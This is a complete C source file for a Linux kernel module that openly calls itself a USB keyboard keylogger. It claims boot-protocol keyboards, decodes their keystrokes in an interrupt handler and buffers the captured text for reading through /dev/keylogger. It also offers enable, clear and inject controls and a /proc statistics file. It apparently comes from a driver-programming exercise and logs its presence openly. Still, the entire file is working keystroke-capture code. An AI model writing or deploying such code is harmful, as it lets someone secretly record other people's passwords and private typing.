#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/usb.h>
#include <linux/cdev.h>
#include <linux/usb/ch9.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/spinlock.h>
#include <linux/wait.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>

#ifndef USB_INTERFACE_CLASS_HID
#define USB_INTERFACE_CLASS_HID          3
#endif

#ifndef USB_INTERFACE_SUBCLASS_BOOT
#define USB_INTERFACE_SUBCLASS_BOOT      1
#endif

#ifndef USB_INTERFACE_PROTOCOL_KEYBOARD
#define USB_INTERFACE_PROTOCOL_KEYBOARD  1
#endif

#define DEVICE_NAME "keylogger"
#define PROC_NAME   "keylogger_stats"
#define BUF_SIZE    1024

// IOCTL Commands
#define KL_MAGIC       'k'
#define KL_RESET_STATS _IO(KL_MAGIC, 0)
#define KL_CLEAR_BUF   _IO(KL_MAGIC, 1)
#define KL_ENABLE      _IO(KL_MAGIC, 2)
#define KL_DISABLE     _IO(KL_MAGIC, 3)

// Essential parts of driver
struct dev {
    dev_t devno;
    struct cdev cdev;
    struct class *cls;

    char buf[BUF_SIZE];
    size_t head, tail;
    bool full;

    spinlock_t lock;
    wait_queue_head_t rq, wq;

    u64 chars_logged, bytes_read, bytes_written;
    u64 overflows, opens;
    bool enabled;

    struct usb_device *udev;
    struct urb *urb;
    unsigned char *irq_buf;
    dma_addr_t irq_dma;
    int irq_maxp;              // max packet size for irq_buf
};

static struct dev *kl;

// File operations for /dev/keylogger
static int kl_open(struct inode *ino, struct file *f);
static ssize_t kl_read(struct file *f, char __user *ubuf, size_t len, loff_t *off);
static ssize_t kl_write(struct file *f, const char __user *ubuf, size_t len, loff_t *off);
static long kl_ioctl(struct file *f, unsigned int cmd, unsigned long arg);

static const struct file_operations kl_fops = {
    .owner          = THIS_MODULE,
    .open           = kl_open,
    .read           = kl_read,
    .write          = kl_write,
    .unlocked_ioctl = kl_ioctl,
};

// /proc functions (must be defined BEFORE kl_proc_ops)
static int kl_proc_show(struct seq_file *m, void *v);
static int kl_proc_open(struct inode *ino, struct file *f);

static const struct proc_ops kl_proc_ops = {
    .proc_open    = kl_proc_open,
    .proc_read    = seq_read,
    .proc_lseek   = seq_lseek,
    .proc_release = single_release,
};

static char hid_to_char(u8 c)
{
    if (c >= 0x04 && c <= 0x1d) return 'a' + (c - 0x04);
    if (c >= 0x1e && c <= 0x26) return '1' + (c - 0x1e);
    if (c == 0x27) return '0';
    if (c == 0x2c) return ' ';
    if (c == 0x28) return '\n';
    return 0;
}

static bool buf_empty(struct dev *d) { return !d->full && d->head == d->tail; }
static bool buf_full(struct dev *d)  { return d->full; }

static void buf_clear(struct dev *d)
{
    d->head = d->tail = 0;
    d->full = false;
}

static void buf_push(struct dev *d, char ch)
{
    d->buf[d->head] = ch;
    d->head = (d->head + 1) % BUF_SIZE;
    if (d->head == d->tail)
        d->full = true;
}

static size_t buf_pop(struct dev *d, char *out, size_t n)
{
    size_t i = 0;

    while (!buf_empty(d) && i < n) {
        out[i++] = d->buf[d->tail];
        d->tail = (d->tail + 1) % BUF_SIZE;
        d->full = false;
    }
    return i;
}

// interrupt handler that runs whenever the keyboard sends data to your driver
static void kl_irq(struct urb *urb)
{
    struct dev *d = urb->context;
    unsigned long flags;
    int i;

    if (urb->status)
        goto resubmit;

    spin_lock_irqsave(&d->lock, flags);
    if (d->enabled) {
        for (i = 2; i < 8; i++) {
            char ch = hid_to_char(d->irq_buf[i]);
            if (!ch) continue;
            if (buf_full(d)) { d->overflows++; continue; }
            buf_push(d, ch);
            d->chars_logged++;
        }
        if (!buf_empty(d))
            wake_up_interruptible(&d->rq);
    }
    spin_unlock_irqrestore(&d->lock, flags);

resubmit:
    usb_submit_urb(urb, GFP_ATOMIC);
}

// "setup" function that runs when a USB keyboard matching your ID table is plugged in
static int kl_probe(struct usb_interface *intf, const struct usb_device_id *id)
{
    struct usb_endpoint_descriptor *ep;
    int pipe, maxp, err;

    if (!kl)
        return -ENODEV;

    if (intf->cur_altsetting->desc.bNumEndpoints < 1)
        return -ENODEV;

    ep = &intf->cur_altsetting->endpoint[0].desc;
    if (!usb_endpoint_is_int_in(ep))
        return -ENODEV;

    kl->udev = interface_to_usbdev(intf);
    pipe = usb_rcvintpipe(kl->udev, ep->bEndpointAddress);
    maxp = usb_maxpacket(kl->udev, pipe);  // FIXED: removed 3rd argument
    kl->irq_maxp = maxp;

    kl->irq_buf = usb_alloc_coherent(kl->udev, maxp, GFP_ATOMIC, &kl->irq_dma);
    if (!kl->irq_buf)
        return -ENOMEM;

    kl->urb = usb_alloc_urb(0, GFP_KERNEL);
    if (!kl->urb) {
        usb_free_coherent(kl->udev, maxp, kl->irq_buf, kl->irq_dma);
        kl->irq_buf = NULL;
        return -ENOMEM;
    }

    usb_fill_int_urb(kl->urb, kl->udev, pipe, kl->irq_buf, maxp,
                     kl_irq, kl, ep->bInterval);
    kl->urb->transfer_dma = kl->irq_dma;
    kl->urb->transfer_flags |= URB_NO_TRANSFER_DMA_MAP;

    err = usb_submit_urb(kl->urb, GFP_ATOMIC);
    if (err) {
        usb_free_urb(kl->urb);
        usb_free_coherent(kl->udev, maxp, kl->irq_buf, kl->irq_dma);
        kl->urb = NULL;
        kl->irq_buf = NULL;
        return err;
    }

    dev_info(&intf->dev, "keylogger attached\n");
    return 0;
}

static void kl_disconnect(struct usb_interface *intf)
{
    if (!kl || kl->udev != interface_to_usbdev(intf))
        return;

    if (kl->urb) {
        usb_kill_urb(kl->urb);
        usb_free_urb(kl->urb);
        kl->urb = NULL;
    }
    if (kl->irq_buf) {
        usb_free_coherent(kl->udev, kl->irq_maxp, kl->irq_buf, kl->irq_dma);
        kl->irq_buf = NULL;
    }
    kl->udev = NULL;
}

static const struct usb_device_id kl_id_table[] = {
    { USB_INTERFACE_INFO(USB_INTERFACE_CLASS_HID,
                         USB_INTERFACE_SUBCLASS_BOOT,
                         USB_INTERFACE_PROTOCOL_KEYBOARD) },
    { }
};
MODULE_DEVICE_TABLE(usb, kl_id_table);

static struct usb_driver kl_usb = {
    .name       = DEVICE_NAME,
    .probe      = kl_probe,
    .disconnect = kl_disconnect,
    .id_table   = kl_id_table,
};

// Character device file operations
static int kl_open(struct inode *ino, struct file *f)
{
    f->private_data = kl;
    kl->opens++;
    return 0;
}

static ssize_t kl_read(struct file *f, char __user *ubuf, size_t len, loff_t *off)
{
    unsigned long flags;
    char *tmp;
    size_t n;
    int ret;

    if (!len) return 0;

    if (buf_empty(kl)) {
        if (f->f_flags & O_NONBLOCK) return -EAGAIN;
        ret = wait_event_interruptible(kl->rq, !buf_empty(kl));
        if (ret) return ret;
    }

    tmp = kmalloc(len, GFP_KERNEL);
    if (!tmp) return -ENOMEM;

    spin_lock_irqsave(&kl->lock, flags);
    n = buf_pop(kl, tmp, len);
    kl->bytes_read += n;
    spin_unlock_irqrestore(&kl->lock, flags);

    ret = copy_to_user(ubuf, tmp, n) ? -EFAULT : (ssize_t)n;
    kfree(tmp);

    wake_up_interruptible(&kl->wq);
    return ret;
}

static ssize_t kl_write(struct file *f, const char __user *ubuf,
                        size_t len, loff_t *off)
{
    unsigned long flags;
    char *tmp;
    size_t i;

    if (!len) return 0;

    tmp = kmalloc(len + 1, GFP_KERNEL);
    if (!tmp) return -ENOMEM;
    if (copy_from_user(tmp, ubuf, len)) { kfree(tmp); return -EFAULT; }
    tmp[len] = '\0';

    if (!strncmp(tmp, "clear", 5)) {
        spin_lock_irqsave(&kl->lock, flags);
        buf_clear(kl);
        spin_unlock_irqrestore(&kl->lock, flags);
    } else if (!strncmp(tmp, "enable", 6)) {
        kl->enabled = true;
    } else if (!strncmp(tmp, "disable", 7)) {
        kl->enabled = false;
    } else if (!strncmp(tmp, "inject:", 7)) {
        for (i = 7; tmp[i]; i++) {
            int ret;
            while (buf_full(kl)) {
                ret = wait_event_interruptible(kl->wq, !buf_full(kl));
                if (ret) { kfree(tmp); return ret; }
            }
            spin_lock_irqsave(&kl->lock, flags);
            if (!buf_full(kl)) {
                buf_push(kl, tmp[i]);
                kl->bytes_written++;
            }
            spin_unlock_irqrestore(&kl->lock, flags);
            wake_up_interruptible(&kl->rq);
        }
    } else {
        kl->bytes_written += len;
    }

    kfree(tmp);
    return len;
}

static long kl_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    unsigned long flags;

    switch (cmd) {
    case KL_RESET_STATS:
        spin_lock_irqsave(&kl->lock, flags);
        kl->chars_logged = kl->bytes_read = kl->bytes_written = 0;
        kl->overflows = kl->opens = 0;
        spin_unlock_irqrestore(&kl->lock, flags);
        break;
    case KL_CLEAR_BUF:
        spin_lock_irqsave(&kl->lock, flags);
        buf_clear(kl);
        spin_unlock_irqrestore(&kl->lock, flags);
        wake_up_interruptible(&kl->wq);
        break;
    case KL_ENABLE:
        kl->enabled = true;
        break;
    case KL_DISABLE:
        kl->enabled = false;
        break;
    default:
        return -ENOTTY;
    }
    return 0;
}

// /proc functions
static int kl_proc_show(struct seq_file *m, void *v)
{
    if (!kl) return 0;
    seq_printf(m, "chars_logged:  %llu\n"
                  "bytes_read:    %llu\n"
                  "bytes_written: %llu\n"
                  "buffer_size:   %d\n"
                  "overflows:     %llu\n"
                  "opens:         %llu\n"
                  "enabled:       %d\n",
           kl->chars_logged, kl->bytes_read, kl->bytes_written,
           BUF_SIZE, kl->overflows, kl->opens, kl->enabled ? 1 : 0);
    return 0;
}

static int kl_proc_open(struct inode *ino, struct file *f)
{
    return single_open(f, kl_proc_show, NULL);
}

static int __init kl_init(void)
{
    int ret = 0;

    kl = kzalloc(sizeof(*kl), GFP_KERNEL);
    if (!kl) return -ENOMEM;

    spin_lock_init(&kl->lock);
    init_waitqueue_head(&kl->rq);
    init_waitqueue_head(&kl->wq);
    kl->enabled = true;

    ret = alloc_chrdev_region(&kl->devno, 0, 1, DEVICE_NAME);
    if (ret) goto fail_free;

    cdev_init(&kl->cdev, &kl_fops);
    ret = cdev_add(&kl->cdev, kl->devno, 1);
    if (ret) goto fail_region;

    kl->cls = class_create(DEVICE_NAME);  // FIXED: no THIS_MODULE
    if (IS_ERR(kl->cls)) {
        ret = PTR_ERR(kl->cls);
        pr_err("keylogger: failed to create device class\n");
        goto fail_cdev;
    }

    if (IS_ERR(device_create(kl->cls, NULL, kl->devno, NULL, DEVICE_NAME))) {
        ret = -ENOMEM;
        goto fail_class;
    }

    if (!proc_create(PROC_NAME, 0444, NULL, &kl_proc_ops)) {
        ret = -ENOMEM;
        goto fail_dev;
    }

    ret = usb_register(&kl_usb);
    if (ret) goto fail_proc;

    pr_info("keylogger: loaded\n");
    return 0;

fail_proc:
    remove_proc_entry(PROC_NAME, NULL);
fail_dev:
    device_destroy(kl->cls, kl->devno);
fail_class:
    class_destroy(kl->cls);
fail_cdev:
    cdev_del(&kl->cdev);
fail_region:
    unregister_chrdev_region(kl->devno, 1);
fail_free:
    kfree(kl); kl = NULL;
    return ret;
}

static void __exit kl_exit(void)
{
    if (!kl) return;
    usb_deregister(&kl_usb);
    remove_proc_entry(PROC_NAME, NULL);
    device_destroy(kl->cls, kl->devno);
    class_destroy(kl->cls);
    cdev_del(&kl->cdev);
    unregister_chrdev_region(kl->devno, 1);
    kfree(kl); kl = NULL;
    pr_info("keylogger: unloaded\n");
}

module_init(kl_init);
module_exit(kl_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("JimBob");
MODULE_DESCRIPTION("Simple USB keyboard keylogger");
